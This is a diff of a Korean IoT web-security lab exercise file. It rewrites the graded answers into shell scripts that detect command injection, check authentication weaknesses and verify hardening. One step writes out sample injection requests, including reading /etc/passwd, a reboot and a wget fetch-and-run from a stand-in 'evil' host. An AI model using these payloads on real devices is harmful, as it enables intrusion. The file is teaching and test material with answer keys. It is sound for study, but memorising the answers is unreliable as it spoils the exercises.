@@ -34,8 +34,9 @@ steps:
       ```
       ✅ 마지막 줄 `GEN_OK`.
     answer: |
-      ready
-      GEN_OK
+      curl -s http://211.170.162.139:10934/api/generate \
+        -d '{"model":"gemma3:4b","prompt":"Reply with the word ready.","stream":false,"options":{"num_predict":10}}' \
+       | python3 -c "import sys,json; r=json.load(sys.stdin).get('response',''); print(r); print('GEN_OK' if r.strip() else 'GEN_EMPTY')"
     answer_detail: "GPU 응답 확인."
     verify:
       type: output_contains
@@ -66,10 +67,20 @@ steps:
       ✅ 마지막 줄 `CMD_INJECTION` (`;`·`|`·`&&`로 reboot·cat passwd·원격 실행 주입).
       🔎 검증 없이 입력을 셸에 넣으면 셸 메타문자(;|&&)로 임의 명령 실행. IoT의 흔한 치명적 취약점.
     answer: |
-      2:POST /cgi-bin/ping.cgi host=8.8.8.8; reboot
-      3:POST /cgi-bin/ping.cgi host=8.8.8.8 | cat /etc/passwd
-      4:POST /cgi-bin/ping.cgi host=8.8.8.8 && wget http://evil/x.sh|sh
-      CMD_INJECTION
+      # 1) IoT 라우터 진단(ping) 페이지에 들어온 요청들을 캡처한 웹 로그를 만든다(host 파라미터가 셸로 전달됨).
+      cat > /tmp/web_requests_STU42.log <<'EOF'
+      POST /cgi-bin/ping.cgi host=8.8.8.8
+      POST /cgi-bin/ping.cgi host=8.8.8.8; reboot
+      POST /cgi-bin/ping.cgi host=8.8.8.8 | cat /etc/passwd
+      POST /cgi-bin/ping.cgi host=8.8.8.8 && wget http://evil/x.sh|sh
+      EOF
+      
+      # 2) host 파라미터에 셸 메타문자(; | & 등)가 든 요청을 grep 으로 찾는다(명령 주입 시도).
+      grep -nE "host=.*[;|&]" /tmp/web_requests_STU42.log
+      
+      # 3) 판정: 주입 시도(메타문자 포함 요청)가 3건 이상이면 명령 주입 취약.
+      N=$(grep -cE "host=.*[;|&]" /tmp/web_requests_STU42.log)
+      [ "$N" -ge 3 ] && echo CMD_INJECTION || echo SAFE
     answer_detail: "웹 입력의 셸 명령 주입 탐지 → CMD_INJECTION."
     verify:
       type: output_contains
@@ -103,15 +114,23 @@ steps:
       ✅ 마지막 줄 `AUTH_BYPASS` (기본 자격+예측 세션+인증없는 API+강제 브라우징).
       🔎 기본 자격·예측 가능 세션·인증 없는 API·접근 통제 부재 — 각각이 인증 우회 경로.
     answer: |
-      [기본 자격]
+      # 1) 점검한 웹 인증 상태를 기록한다(펌웨어/설정 분석 결과).
+      cat > /tmp/web_auth_STU42.txt <<'EOF'
       default_creds=admin/admin
-      [세션 토큰]
       session_token=predictable(sequential)
-      [API 인증]
       api_auth=none
-      [접근 통제]
       access_control=none
-      AUTH_BYPASS
+      EOF
+      
+      # 2) 각 인증 약점을 grep 으로 확인한다.
+      echo "[기본 자격]"; grep "default_creds=admin" /tmp/web_auth_STU42.txt
+      echo "[세션 토큰]"; grep "predictable" /tmp/web_auth_STU42.txt
+      echo "[API 인증]"; grep "api_auth=none" /tmp/web_auth_STU42.txt
+      echo "[접근 통제]"; grep "access_control=none" /tmp/web_auth_STU42.txt
+      
+      # 3) 판정: 인증 우회 경로가 3개 이상이면 AUTH_BYPASS.
+      B=$(grep -cE "admin/admin|predictable|=none" /tmp/web_auth_STU42.txt)
+      [ "$B" -ge 3 ] && echo AUTH_BYPASS || echo SECURE
     answer_detail: "기본 자격·약한 세션·인증없는 API 평가 → AUTH_BYPASS."
     verify:
       type: output_contains
@@ -146,9 +165,24 @@ steps:
       ✅ 마지막 줄 `WEB_HARDENED` (입력 검증으로 주입 거부, 인증·CSRF·접근 통제 적용).
       🔎 입력을 IP 형식으로 엄격 검증(셸 안 씀)+기본 자격 변경+CSRF 토큰+API 인증+접근 통제. 웹 보안 기본.
     answer: |
-      ACCEPT: 8.8.8.8 (유효 IP)
-      REJECT: 8.8.8.8; reboot (형식 위반)
-      WEB_HARDENED
+      # 1) 강화된 웹 설정(입력 검증·강제 자격 변경·CSRF·API 인증·접근 통제)을 기록한다.
+      cat > /tmp/web_hardened_STU42.txt <<'EOF'
+      input_validation=ip_only(정규식 검증, 셸 미사용)
+      forced_cred_change=true
+      csrf_token=true
+      api_auth=required
+      access_control=rbac
+      EOF
+      
+      # 2) 강화된 입력 검증으로 주입 시도가 거부되는지 로직을 확인한다(IP 형식만 허용).
+      for host in "8.8.8.8" "8.8.8.8; reboot"; do
+        if echo "$host" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$'; then echo "ACCEPT: $host (유효 IP)"; else echo "REJECT: $host (형식 위반)"; fi
+      done
+      
+      # 3) 판정: 5대 통제가 모두 켜지고 주입 IP 가 거부되면 강화 완료.
+      C=$(grep -cE "true|required|rbac|ip_only" /tmp/web_hardened_STU42.txt)
+      echo "8.8.8.8; reboot" | grep -qE '^[0-9.]+$' && REJ=0 || REJ=1
+      { [ "$C" -ge 5 ] && [ "$REJ" = "1" ]; } && echo WEB_HARDENED || echo CHECK
     answer_detail: "입력검증·인증·CSRF·접근 통제 강화 → WEB_HARDENED."
     verify:
       type: output_contains
@@ -167,9 +201,9 @@ steps:
       🔎 정리: IoT 웹은 급조돼 명령 주입·인증 우회에 취약. 입력검증+강한 인증+CSRF+접근 통제로 방어.
       다음 주(W06)는 **무선 프로토콜 해킹(Zigbee 등)**.
     answer: |
-      Assessment
-      IoT web UIs are often hastily built with missing web-security basics, enabling command injection and auth bypass.
-      Defense applies input validation, strong authentication, CSRF tokens, and access control.
+      curl -s http://211.170.162.139:10934/api/generate \
+        -d '{"model":"gemma3:4b","prompt":"Write a short note for W05 on IoT web interfaces. Findings: shell metacharacters in a ping field enabled command injection (CMD_INJECTION), default credentials plus weak sessions and unauthenticated APIs enabled auth bypass (AUTH_BYPASS), and strict input validation plus authentication, CSRF tokens, and access control hardened it (WEB_HARDENED). Explain that IoT web UIs are often hastily built with missing web-security basics, so defense applies input validation, strong auth, CSRF protection, and access control. Start with exactly Assessment on its own line.","stream":false,"options":{"num_predict":330}}' \
+       | python3 -c "import sys,json; r=json.load(sys.stdin).get('response',''); print(r); print('' if 'Assessment' in r else '[형식 미준수 — 재실행]')"
     answer_detail: "W05 IoT 웹 종합(Assessment). 명령 주입·인증 우회·웹 보안 기본."
     verify:
       type: output_contains
